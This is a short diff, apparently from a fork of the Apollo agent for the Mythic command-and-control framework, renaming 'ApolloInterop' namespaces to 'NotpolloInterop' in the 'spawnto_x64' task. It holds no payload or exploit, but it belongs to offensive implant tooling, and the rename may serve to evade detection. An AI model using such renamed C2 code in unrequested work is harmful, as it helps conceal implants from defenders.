@@ -6,9 +6,9 @@
 
 #if SPAWNTO_X64
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Classes;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -30,7 +30,7 @@ namespace Tasks
             public string Arguments;
         }
 
-        public spawnto_x64(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public spawnto_x64(IAgent agent, NotpolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
         }
 
